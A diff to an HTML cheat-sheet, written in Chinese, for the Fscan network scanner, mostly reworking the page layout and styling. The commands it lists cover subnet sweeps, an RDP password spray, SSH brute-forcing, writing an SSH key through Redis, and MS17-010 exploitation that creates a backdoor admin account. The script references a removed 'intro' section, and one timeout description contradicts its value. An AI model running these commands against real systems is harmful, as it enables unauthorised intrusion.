@@ -3,45 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fscan网络安全扫描工具手册</title>
+    <title>Fscan工具手册</title>
     <script src="https://cdn.tailwindcss.com/3.3.3"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
     <style>
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%);
-            color: #1e293b;
+            background-color: #1a1a2e;
+            color: #e2e8f0;
+            display: flex;
+            min-height: 100vh;
         }
         .glass-card {
-            background: rgba(255, 255, 255, 0.8);
+            background: rgba(30, 41, 59, 0.8);
             backdrop-filter: blur(10px);
             border-radius: 12px;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3);
             transition: all 0.3s ease;
+            display: none;
         }
-        .glass-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 12px 28px 0 rgba(31, 38, 135, 0.15);
-        }
-        .nav-link {
-            position: relative;
-        }
-        .nav-link::after {
-            content: '';
-            position: absolute;
-            bottom: -2px;
-            left: 0;
-            width: 0;
-            height: 2px;
-            background: #3b82f6;
-            transition: width 0.3s ease;
-        }
-        .nav-link:hover::after {
-            width: 100%;
+        .glass-card.active {
+            display: block;
+            animation: fadeIn 0.5s ease forwards;
         }
         .code-block {
-            background: #1e293b;
+            background: #0f172a;
             color: #f8fafc;
             border-radius: 8px;
             position: relative;
@@ -63,8 +50,8 @@
         }
         .param-tag {
             display: inline-block;
-            background: #e0f2fe;
-            color: #0369a1;
+            background: rgba(59, 130, 246, 0.2);
+            color: #93c5fd;
             padding: 2px 8px;
             border-radius: 999px;
             font-size: 0.85rem;
@@ -75,7 +62,7 @@
             position: absolute;
             width: 300px;
             height: 300px;
-            background: linear-gradient(135deg, #93c5fd 0%, #a5b4fc 100%);
+            background: linear-gradient(135deg, #1e3a8a 0%, #4338ca 100%);
             filter: blur(80px);
             opacity: 0.2;
             border-radius: 50%;
@@ -85,8 +72,102 @@
             from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .animate-fade-in {
-            animation: fadeIn 0.6s ease forwards;
+        .sidebar {
+            width: 200px;
+            min-width: 200px;
+            background: rgba(15, 23, 42, 0.9);
+            backdrop-filter: blur(10px);
+            border-right: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            overflow-y: auto;
+            z-index: 50;
+            transition: transform 0.3s ease;
+        }
+        .nav-item {
+            display: flex;
+            align-items: center;
+            padding: 8px 12px;
+            margin-bottom: 4px;
+            border-radius: 8px;
+            color: #94a3b8;
+            transition: all 0.2s ease;
+            font-size: 0.9rem;
+        }
+        .nav-item i {
+            margin-right: 8px;
+            font-size: 0.9rem;
+        }
+        .nav-item:hover {
+            background: rgba(59, 130, 246, 0.2);
+            color: #93c5fd;
+        }
+        .nav-item.active {
+            background: rgba(59, 130, 246, 0.3);
+            color: #60a5fa;
+            font-weight: 600;
+        }
+        .nav-group {
+            margin-bottom: 15px;
+        }
+        .nav-group-title {
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #64748b;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 8px;
+            padding-left: 12px;
+        }
+        .main-content {
+            flex-grow: 1;
+            padding: 20px;
+            overflow-y: auto;
+        }
+        .mobile-menu-btn {
+            display: none;
+            width: 100%;
+            padding: 10px;
+            background: rgba(59, 130, 246, 0.2);
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 10px;
+            cursor: pointer;
+            color: #93c5fd;
+        }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #60a5fa;
+            animation: spin 1s ease-in-out infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        @media (max-width: 768px) {
+            body {
+                flex-direction: column;
+            }
+            .sidebar {
+                position: fixed;
+                top: 0;
+                left: 0;
+                bottom: 0;
+                transform: translateX(-100%);
+                width: 250px;
+            }
+            .sidebar.active {
+                transform: translateX(0);
+            }
+            .main-content {
+                margin-left: 0;
+                padding-top: 60px;
+            }
+            .mobile-menu-btn {
+                display: block;
+            }
         }
     </style>
 </head>
@@ -94,197 +175,194 @@
     <div class="blob top-0 left-0"></div>
     <div class="blob bottom-0 right-0"></div>
 
-    <!-- 导航栏 -->
-    <nav class="sticky top-0 z-50 bg-white/80 backdrop-blur-md shadow-sm">
-        <div class="container mx-auto px-4 py-3 flex justify-between items-center">
-            <div class="flex items-center">
-                <i class="fas fa-shield-alt text-blue-500 text-2xl mr-2"></i>
-                <h1 class="text-xl font-bold bg-gradient-to-r from-blue-500 to-indigo-600 bg-clip-text text-transparent">Fscan安全扫描工具</h1>
-            </div>
-            <div class="hidden md:flex space-x-6">
-                <a href="#intro" class="nav-link text-slate-600 hover:text-blue-500">工具简介</a>
-                <a href="#modules" class="nav-link text-slate-600 hover:text-blue-500">使用模块</a>
-            </div>
-            <button class="md:hidden text-slate-600" id="mobileMenuBtn">
-                <i class="fas fa-bars text-xl"></i>
-            </button>
+    <!-- 侧边导航栏 -->
+    <div class="sidebar" id="sidebar">
+        <div class="flex items-center mb-6">
+            <i class="fas fa-shield-alt text-blue-400 text-xl mr-2"></i>
+            <h1 class="text-lg font-bold bg-gradient-to-r from-blue-400 to-indigo-500 bg-clip-text text-transparent">Fscan扫描工具</h1>
         </div>
-    </nav>
+
+        <button class="mobile-menu-btn" id="mobileMenuBtn">
+            <i class="fas fa-bars mr-2"></i>菜单
+        </button>
+
+        <div class="nav-group">
+            <div class="nav-group-title">主菜单</div>
+
+            <a href="#one-click" class="nav-item" data-target="one-click">
+                <i class="fas fa-bolt"></i>一把梭
+            </a>
+            <a href="#web-scan" class="nav-item" data-target="web-scan">
+                <i class="fas fa-globe"></i>Web服务探测
+            </a>
+            <a href="#service-detect" class="nav-item" data-target="service-detect">
+                <i class="fas fa-search"></i>服务检测
+            </a>
+            <a href="#password-spray" class="nav-item" data-target="password-spray">
+                <i class="fas fa-shower"></i>密码喷洒
+            </a>
+            <a href="#weak-password" class="nav-item" data-target="weak-password">
+                <i class="fas fa-key"></i>弱口令检测
+            </a>
+            <a href="#exploit" class="nav-item" data-target="exploit">
+                <i class="fas fa-bug"></i>漏洞利用
+            </a>
+        </div>
+    </div>
 
     <!-- 主内容区 -->
-    <main class="container mx-auto px-4 py-8">
-        工具简介
-        <section id="intro" class="glass-card p-6 mb-8 animate-fade-in" style="animation-delay: 0.1s;">
+    <div class="main-content">
+       
+
+        <!-- 一把梭模块 -->
+        <section id="one-click" class="glass-card p-6 mb-8">
             <div class="flex items-center mb-4">
-                <div class="w-10 h-10 rounded-full bg-blue-100 flex items-center justify-center text-blue-500 mr-3">
-                    <i class="fas fa-info-circle"></i>
+                <div class="w-8 h-8 rounded-full bg-green-900 flex items-center justify-center text-green-400 mr-3">
+                    <i class="fas fa-bolt"></i>
                 </div>
-                <h2 class="text-2xl font-bold text-slate-800">一、工具简介</h2>
+                <h3 class="text-xl font-semibold text-slate-200">1) 一把梭</h3>
             </div>
-            <p class="text-slate-600 leading-relaxed">
-                Fscan是一款功能强大的安全扫描工具，可用于网络安全检测、漏洞扫描等多种场景。本手册将详细介绍Fscan的不同使用模块及对应的命令参数。
-            </p>
+            <div class="code-block p-4 mb-4 relative">
+                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy mr-1"></i>复制</button>
+                <code>fscan -t 150 -time 5 -h 192.168.0.0/16</code>
+            </div>
+            
+            <h4 class="font-medium text-slate-300 mb-2">参数解释</h4>
+            <div class="flex flex-wrap">
+                <span class="param-tag"><span class="font-semibold">-t 150</span>：设置扫描的线程数为150</span>
+                <span class="param-tag"><span class="font-semibold">-time 5</span>：设置扫描的超时时间为5秒</span>
+                <span class="param-tag"><span class="font-semibold">-p service</span>：指定扫描的服务类型为常规服务</span>
+                <span class="param-tag"><span class="font-semibold">-h 192.168.0.0/16</span>：指定扫描的目标网络范围</span>
+            </div>
         </section>
 
-        <!-- 使用模块介绍 -->
-        <section id="modules" class="mb-8">
-            <div class="flex items-center mb-6">
-                <div class="w-10 h-10 rounded-full bg-indigo-100 flex items-center justify-center text-indigo-500 mr-3">
-                    <i class="fas fa-cubes"></i>
+        <!-- Web服务探测模块 -->
+        <section id="web-scan" class="glass-card p-6 mb-8">
+            <div class="flex items-center mb-4">
+                <div class="w-8 h-8 rounded-full bg-purple-900 flex items-center justify-center text-purple-400 mr-3">
+                    <i class="fas fa-globe"></i>
                 </div>
-                <h2 class="text-2xl font-bold text-slate-800">二、使用模块介绍</h2>
+                <h3 class="text-xl font-semibold text-slate-200">2) Web服务探测</h3>
+            </div>
+            
+            <div class="code-block p-4 mb-4 relative">
+                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy mr-1"></i>复制</button>
+                <code>fscan -t 100 -time 5 -wt 8 -p web -h 192.168.0.1/24</code>
+            </div>
+            
+            <h4 class="font-medium text-slate-300 mb-2">参数解释</h4>
+            <div class="flex flex-wrap">
+                <span class="param-tag"><span class="font-semibold">-wt 8</span>：设置Web服务探测的超时时间为15秒</span>
+                <span class="param-tag"><span class="font-semibold">-p web</span>：指定扫描的服务类型为Web服务</span>
+            </div>
+        </section>
+
+        <!-- 服务检测模块 -->
+        <section id="service-detect" class="glass-card p-6 mb-8">
+            <div class="flex items-center mb-4">
+                <div class="w-8 h-8 rounded-full bg-red-900 flex items-center justify-center text-red-400 mr-3">
+                    <i class="fas fa-search"></i>
+                </div>
+                <h3 class="text-xl font-semibold text-slate-200">3) 服务检测</h3>
+            </div>
+            
+            <div class="code-block p-4 mb-4 relative">
+                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy mr-1"></i>复制</button>
+                <code>fscan -t 100 -time 5 -p service -nobr -noredis -np -hf ips.txt</code>
+            </div>
+            
+            <h4 class="font-medium text-slate-300 mb-2">参数解释</h4>
+            <div class="flex flex-wrap">
+                <span class="param-tag"><span class="font-semibold">-noredis</span>：不扫描Redis服务</span>
+                <span class="param-tag"><span class="font-semibold">-hf ips.txt</span>：指定扫描的目标IP地址列表</span>
+            </div>
+        </section>
+
+        <!-- 密码喷洒模块 -->
+        <section id="password-spray" class="glass-card p-6 mb-8">
+            <div class="flex items-center mb-4">
+                <div class="w-8 h-8 rounded-full bg-orange-900 flex items-center justify-center text-orange-400 mr-3">
+                    <i class="fas fa-shower"></i>
+                </div>
+                <h3 class="text-xl font-semibold text-slate-200">4) 密码喷洒</h3>
+            </div>
+            
+            <div class="code-block p-4 mb-4 relative">
+                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy mr-1"></i>复制</button>
+                <code>fscan -m rdp -user administrator -pwd P@ssword -hf rdp.txt</code>
+            </div>
+            
+            <h4 class="font-medium text-slate-300 mb-2">参数解释</h4>
+            <div class="flex flex-wrap">
+                <span class="param-tag"><span class="font-semibold">-m rdp</span>：指定扫描的服务类型为RDP</span>
+                <span class="param-tag"><span class="font-semibold">-user administrator</span>：指定要尝试的用户名</span>
+                <span class="param-tag"><span class="font-semibold">-pwd P@ssword</span>：指定要尝试的密码</span>
+            </div>
+        </section>
+
+        <!-- 弱口令检测模块 -->
+        <section id="weak-password" class="glass-card p-6 mb-8">
+            <div class="flex items-center mb-4">
+                <div class="w-8 h-8 rounded-full bg-yellow-900 flex items-center justify-center text-yellow-400 mr-3">
+                    <i class="fas fa-key"></i>
+                </div>
+                <h3 class="text-xl font-semibold text-slate-200">5) 弱口令检测</h3>
+            </div>
+            
+            <div class="code-block p-4 mb-4 relative">
+                <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy mr-1"></i>复制</button>
+                <code>fscan -m ssh -hf ssh.txt</code>
+            </div>
+            
+            <h4 class="font-medium text-slate-300 mb-2">爆破参数说明</h4>
+            <div class="flex flex-wrap">
+                <span class="param-tag"><span class="font-semibold">-usera string</span>：在默认用户列表基础上添加自定义用户名</span>
+                <span class="param-tag"><span class="font-semibold">-pwda string</span>：在默认密码列表基础上添加自定义密码</span>
+                <span class="param-tag"><span class="font-semibold">-userf string</span>：从文件中读取用户名字典</span>
+                <span class="param-tag"><span class="font-semibold">-pwdf string</span>：从文件中读取密码字典</span>
+            </div>
+        </section>
+
+        <!-- 漏洞利用模块 -->
+        <section id="exploit" class="glass-card p-6">
+            <div class="flex items-center mb-4">
+                <div class="w-8 h-8 rounded-full bg-pink-900 flex items-center justify-center text-pink-400 mr-3">
+                    <i class="fas fa-bug"></i>
+                </div>
+                <h3 class="text-xl font-semibold text-slate-200">6) 漏洞利用</h3>
             </div>
 
-            <!-- 一把梭模块 -->
-            <div class="glass-card p-6 mb-6 animate-fade-in" style="animation-delay: 0.2s;">
-                <div class="flex items-center mb-4">
-                    <div class="w-8 h-8 rounded-full bg-green-100 flex items-center justify-center text-green-500 mr-3">
-                        <i class="fas fa-bolt"></i>
-                    </div>
-                    <h3 class="text-xl font-semibold text-slate-800">1. 一把梭</h3>
-                </div>
-                <div class="code-block p-4 mb-4 relative">
+            <!-- Redis写公钥 -->
+            <div class="mb-6">
+                <h4 class="font-medium text-slate-300 mb-2">Redis写公钥</h4>
+                <div class="code-block p-4 mb-2 relative">
                     <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy mr-1"></i>复制</button>
-                    <code>fscan -t 150 -time 5 -h 192.168.0.0/16</code>
-                </div>
-                
-                <h4 class="font-medium text-slate-700 mb-2">参数解释</h4>
-                <div class="flex flex-wrap">
-                    <span class="param-tag"><span class="font-semibold">-t 150</span>：设置扫描的线程数为150</span>
-                    <span class="param-tag"><span class="font-semibold">-time 5</span>：设置扫描的超时时间为5秒</span>
-                    <span class="param-tag"><span class="font-semibold">-p service</span>：指定扫描的服务类型为常规服务</span>
-                    <span class="param-tag"><span class="font-semibold">-h 192.168.0.0/16</span>：指定扫描的目标网络范围</span>
+                    <code>fscan -p 6379 -rf /root/.ssh/id_rsa.pub -hf redis.txt</code>
                 </div>
             </div>
 
-            <!-- Web服务探测模块 -->
-            <div class="glass-card p-6 mb-6 animate-fade-in" style="animation-delay: 0.3s;">
-                <div class="flex items-center mb-4">
-                    <div class="w-8 h-8 rounded-full bg-purple-100 flex items-center justify-center text-purple-500 mr-3">
-                        <i class="fas fa-globe"></i>
-                    </div>
-                    <h3 class="text-xl font-semibold text-slate-800">2. Web服务探测</h3>
-                </div>
+            <!-- MS17-010利用 -->
+            <div>
+                <h4 class="font-medium text-slate-300 mb-2">MS17-010利用</h4>
+                <p class="text-slate-400 mb-2">执行此命令后会生成一个用户，用户名：sysadmin 密码：'1qaz@WSX!@#4'</p>
                 
-                <div class="code-block p-4 mb-4 relative">
+                <div class="code-block p-4 mb-2 relative">
                     <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy mr-1"></i>复制</button>
-                    <code>fscan -t 100 -time 5 -wt 8 -p web -h 192.168.0.1/24</code>
-                </div>
-                
-                <h4 class="font-medium text-slate-700 mb-2">参数解释</h4>
-                <div class="flex flex-wrap">
-                    <span class="param-tag"><span class="font-semibold">-wt 8</span>：设置Web服务探测的超时时间为15秒</span>
-                    <span class="param-tag"><span class="font-semibold">-p web</span>：指定扫描的服务类型为Web服务</span>
-                </div>
-            </div>
-
-            <!-- 横向渗透模块 -->
-            <div class="glass-card p-6 mb-6 animate-fade-in" style="animation-delay: 0.4s;">
-                <div class="flex items-center mb-4">
-                    <div class="w-8 h-8 rounded-full bg-red-100 flex items-center justify-center text-red-500 mr-3">
-                        <i class="fas fa-arrows-alt-h"></i>
-                    </div>
-                    <h3 class="text-xl font-semibold text-slate-800">3. 横向渗透</h3>
-                </div>
-
-                <!-- 服务检测 -->
-                <div class="mb-6">
-                    <h3 class="font-medium text-slate-700 mb-2">服务检测</h3>
-                    <div class="code-block p-4 mb-2 relative">
-                        <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy mr-1"></i>复制</button>
-                        <code>fscan -t 100 -time 5 -p service -nobr -noredis -np -hf ips.txt</code>
-                    </div>
-                    
-                    <h5 class="text-slate-600 mb-2">参数解释</h5>
-                    <div class="flex flex-wrap">
-                        <span class="param-tag"><span class="font-semibold">-noredis</span>：不扫描Redis服务</span>
-                        <span class="param-tag"><span class="font-semibold">-hf ips.txt</span>：指定扫描的目标IP地址列表</span>
-                    </div>
-                </div>
-
-                <!-- 密码喷洒 -->
-                <div class="mb-6">
-                    <h3 class="font-medium text-slate-700 mb-2">密码喷洒</h3>
-                    <div class="code-block p-4 mb-2 relative">
-                        <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy mr-1"></i>复制</button>
-                        <code>fscan -m rdp -user administrator -pwd P@ssword -hf rdp.txt</code>
-                    </div>
-                    
-                    <h5 class="text-slate-600 mb-2">参数解释</h5>
-                    <div class="flex flex-wrap">
-                        <span class="param-tag"><span class="font-semibold">-m rdp</span>：指定扫描的服务类型为RDP</span>
-                        <span class="param-tag"><span class="font-semibold">-user administrator</span>：指定要尝试的用户名</span>
-                        <span class="param-tag"><span class="font-semibold">-pwd P@ssword</span>：指定要尝试的密码</span>
-                    </div>
-                </div>
-
-                <!-- 弱口令检测 -->
-                <div class="mb-6">
-                    <h3 class="font-medium text-slate-700 mb-2">弱口令检测</h3>
-                    <div class="code-block p-4 mb-2 relative">
-                        <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy mr-1"></i>复制</button>
-                        <code>fscan -m ssh -hf ssh.txt</code>
-                    </div>
-                </div>
-
-                <!-- 爆破参数说明 -->
-                <div>
-                    <h4 class="font-medium text-slate-700 mb-2">爆破参数说明</h4>
-                    <div class="flex flex-wrap">
-                        <span class="param-tag"><span class="font-semibold">-usera string</span>：在默认用户列表基础上添加自定义用户名</span>
-                        <span class="param-tag"><span class="font-semibold">-pwda string</span>：在默认密码列表基础上添加自定义密码</span>
-                        <span class="param-tag"><span class="font-semibold">-userf string</span>：从文件中读取用户名字典</span>
-                        <span class="param-tag"><span class="font-semibold">-pwdf string</span>：从文件中读取密码字典</span>
-                    </div>
-                </div>
-            </div>
-
-            <!-- 漏洞利用模块 -->
-            <div class="glass-card p-6 animate-fade-in" style="animation-delay: 0.5s;">
-                <div class="flex items-center mb-4">
-                    <div class="w-8 h-8 rounded-full bg-yellow-100 flex items-center justify-center text-yellow-500 mr-3">
-                        <i class="fas fa-bug"></i>
-                    </div>
-                    <h3 class="text-xl font-semibold text-slate-800">4. 漏洞利用</h3>
-                </div>
-
-                <!-- Redis写公钥 -->
-                <div class="mb-6">
-                    <h4 class="font-medium text-slate-700 mb-2">Redis写公钥</h4>
-                    <div class="code-block p-4 mb-2 relative">
-                        <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy mr-1"></i>复制</button>
-                        <code>fscan -p 6379 -rf /root/.ssh/id_rsa.pub -hf redis.txt</code>
-                    </div>
-                </div>
-
-                <!-- MS17-010利用 -->
-                <div>
-                    <h4 class="font-medium text-slate-700 mb-2">MS17-010利用</h4>
-                    <p class="text-slate-600 mb-2">执行此命令后会生成一个用户，用户名：sysadmin 密码：'1qaz@WSX!@#4'</p>
-                    
-                    <div class="code-block p-4 mb-2 relative">
-                        <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy mr-1"></i>复制</button>
-                        <code>fscan -h 192.168.1.1 -m ms17010 -sc add</code>
-                    </div>
+                    <code>fscan -h 192.168.1.1 -m ms17010 -sc add</code>
                 </div>
             </div>
         </section>
-    </main>
 
-    <!-- 页脚 -->
-    <footer class="bg-white/80 backdrop-blur-md py-6 mt-12">
-        <div class="container mx-auto px-4 text-center text-slate-500 text-sm">
-            <p>created by <a href="https://wintrysec.github.io" class="text-blue-500 hover:text-blue-600">wintry</a></p>
-        </div>
-    </footer>
+        <!-- 页脚 -->
+        <!-- <footer class="bg-slate-800/80 backdrop-blur-md py-6 mt-12">
+            <div class="container mx-auto px-4 text-center text-slate-400 text-sm">
+                <p>created by <a href="https://space.coze.cn" class="text-blue-400 hover:text-blue-300">coze space</a></p>
+                <p>页面内容均由 AI 生成，仅供参考</p>
+            </div>
+        </footer> -->
+    </div>
 
     <script>
-        // 移动端菜单切换
-        document.getElementById('mobileMenuBtn').addEventListener('click', function() {
-            const menu = document.getElementById('mobileMenu');
-            menu.classList.toggle('hidden');
-        });
-
         // 复制代码功能
         function copyCode(btn) {
             const codeBlock = btn.parentElement;
@@ -298,31 +376,63 @@
             });
         }
 
-        // 滚动动画
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.classList.add('animate-fade-in');
-                }
-            });
-        }, { threshold: 0.1 });
-
-        document.querySelectorAll('section').forEach(section => {
-            observer.observe(section);
-        });
-
-        // 平滑滚动
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function(e) {
+        // 模块切换功能
+        document.querySelectorAll('.nav-item').forEach(item => {
+            item.addEventListener('click', function(e) {
                 e.preventDefault();
-                const target = document.querySelector(this.getAttribute('href'));
-                if (target) {
-                    target.scrollIntoView({
-                        behavior: 'smooth'
+                
+                // 显示加载状态
+                const loadingIcon = document.createElement('span');
+                loadingIcon.className = 'loading';
+                this.appendChild(loadingIcon);
+                
+                // 更新导航项激活状态
+                document.querySelectorAll('.nav-item').forEach(navItem => {
+                    navItem.classList.remove('active');
+                });
+                this.classList.add('active');
+                
+                // 隐藏所有内容模块
+                document.querySelectorAll('.glass-card').forEach(card => {
+                    card.classList.remove('active');
+                });
+                
+                // 显示当前选中模块
+                const targetId = this.getAttribute('data-target');
+                const targetSection = document.getElementById(targetId);
+                
+                // 模拟加载延迟
+                setTimeout(() => {
+                    targetSection.classList.add('active');
+                    loadingIcon.remove();
+                    
+                    // 平滑滚动到目标位置
+                    targetSection.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
                     });
-                }
+                }, 300);
             });
         });
+
+        // 移动端菜单切换
+        document.getElementById('mobileMenuBtn').addEventListener('click', function() {
+            const sidebar = document.getElementById('sidebar');
+            sidebar.classList.toggle('active');
+            
+            // 切换图标
+            const icon = this.querySelector('i');
+            if (sidebar.classList.contains('active')) {
+                icon.classList.remove('fa-bars');
+                icon.classList.add('fa-times');
+            } else {
+                icon.classList.remove('fa-times');
+                icon.classList.add('fa-bars');
+            }
+        });
+
+        // 初始化页面时显示第一个模块
+        document.getElementById('intro').classList.add('active');
     </script>
 </body>
 </html>
